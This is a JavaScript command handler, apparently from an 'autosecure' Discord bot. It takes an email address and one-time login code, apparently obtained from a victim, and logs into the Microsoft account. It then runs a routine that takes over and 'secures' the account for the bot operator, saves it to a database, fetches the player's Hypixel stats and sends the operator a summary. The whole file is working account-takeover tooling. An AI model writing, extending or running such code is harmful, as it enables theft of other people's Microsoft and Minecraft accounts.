const validEmail = require('../../utils/emails/validEmail');
const axios = require("axios");
const login = require('../../utils/secure/login');
const secure = require('../../utils/secure/recodesecure');
const listAccount = require("../../../autosecure/utils/accounts/listAccount");
const { queryParams } = require("../../../db/database");
const statsembed = require("../../../autosecure/utils/stats/statsembed");
const fetchStats = require("../../../autosecure/utils/hypixelapi/fetchStats");
const generateuid = require('../../utils/generateuid')
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const insertaccount = require("../../../db/insertaccount")
const getStats = require('../../utils/hypixelapi/getStats')
const mcregex = require("../../.././autosecure/utils/utils/mcregex");
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");
module.exports = {
    name: "otpsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        console.log(`[OTP_SECURE] OTP secure modal submitted by user: ${interaction.user.id} (${interaction.user.username})`);
        await interaction.deferReply({ ephemeral: true });

        let email = interaction.components[0].components[0].value;
        let otp = interaction.components[1].components[0].value;
        const mcign = interaction.components[2].components[0].value || null;
        console.log(`[OTP_SECURE] Email: ${email}, OTP: ${otp ? 'provided' : 'missing'}, MC Username: ${mcign || 'none'}`);

        if (mcign && !mcregex(mcign)) {
            console.log(`[OTP_SECURE] Invalid Minecraft username: ${mcign}`);
            return interaction.editReply({
                content: "Please enter a valid minecraft username!"
            });
        }

        if (!validEmail(email)) {
            console.log(`[OTP_SECURE] Invalid email format: ${email}`);
            return interaction.editReply({ content: `Invalid Email` });
        }

        if (isNaN(otp) || otp.length < 6 || otp.length > 7) {
            console.log(`[OTP_SECURE] Invalid OTP format: ${otp}`);
            return interaction.editReply({ content: `Invalid OTP` });
        }

        console.log(`[OTP_SECURE] Fetching user settings for: ${interaction.user.id}`);
        let settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
        if (settings.length === 0) {
            console.log(`[OTP_SECURE] No settings found for user: ${interaction.user.id}`);
            return interaction.editReply({
                embeds: [{
                    title: `Error :x:`,
                    description: `Couldn't find your settings! Please report this to an admin.`,
                    color: 0xff0000
                }]
            });
        }

        settings = settings[0];
        console.log(`[OTP_SECURE] Settings loaded for user: ${interaction.user.id}`);
        let profiles = null;
        console.log(`[OTP_SECURE] Getting credentials for email: ${email}`);
        const data = await getCredentials(email, false);
        profiles = data;
        console.log(`[OTP_SECURE] Credentials retrieved: ${profiles ? 'success' : 'failed'}`);

        try {
            if (!profiles?.Credentials || !profiles?.Credentials?.OtcLoginEligibleProofs) {
                console.log(`[OTP_SECURE] Invalid email or OTP disabled for: ${email}`);
                return interaction.editReply({ content: `Invalid email / OTP Disabled` });
            }
            console.log(`[OTP_SECURE] OTP login eligible proofs found: ${profiles?.Credentials?.OtcLoginEligibleProofs?.length || 0}`);
        } catch (error) {
            console.error("[OTP_SECURE] Error parsing profiles data:", error);
            return interaction.editReply({ content: `Email doesn't exist!` });
        }

        console.log(`[OTP_SECURE] Attempting login with OTP...`);
        for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
            console.log(`[OTP_SECURE] Trying OTP proof with ID: ${sec.data}`);
            let host = await login({ email: email, id: sec.data, code: otp }, profiles);
            if (host) {
                console.log(`[OTP_SECURE] Login successful, host obtained`);
                const expireTimestamp = Math.floor((Date.now() / 1000) + 900);
                let uid = await generateuid();

                const embed = {
                    title: 'This account is being automatically secured.',
                    color: 0x808080
                };
                
                const components = [
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId(`status|${uid}`)
                            .setLabel('⏳ Status')
                            .setStyle(ButtonStyle.Primary)
                    )
                ];
                
                await interaction.editReply({ embeds: [embed], components });
                

                await interaction.user.send({ embeds: [embed], components });
                
                try {
                    console.log(`uid: ${uid}`);
                    let acc = await secure(host, settings, uid, mcign);
                  
              let inserted =  insertaccount(acc, uid, client.username, settings.secureifnomc)


                    const failedmsg = await failedembed(acc, uid)
                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }


                    if (acc.newName == "No Minecraft!") {
                        let accountmessage = await listAccount(acc, uid, client, interaction);;
                        await interaction.user.send(accountmessage);
                        return;
                    }
                    
                    
                  //  console.log(stats);
                    let statsoverview = await statsembed(client, acc, interaction);
                    let accountmessage = await listAccount(acc, uid, client, interaction);;
                    
         
                    if (statsoverview) {
                        await interaction.user.send(statsoverview);
                    }
                    await interaction.user.send(accountmessage);
                    await interaction.editReply({accountmessage})
                } catch (error) {
                    console.log(error);
                    await interaction.editReply({
                        embeds: [{
                            title: `Failed securing!`,
                            description: `An error occurred while securing your account.\n Please use the status button to log in to your account.`,
                            color: 0xff0000
                        }],
                    });
                }
                return;
            }
        }

        await interaction.editReply(`Failed to login!`);
    }
};
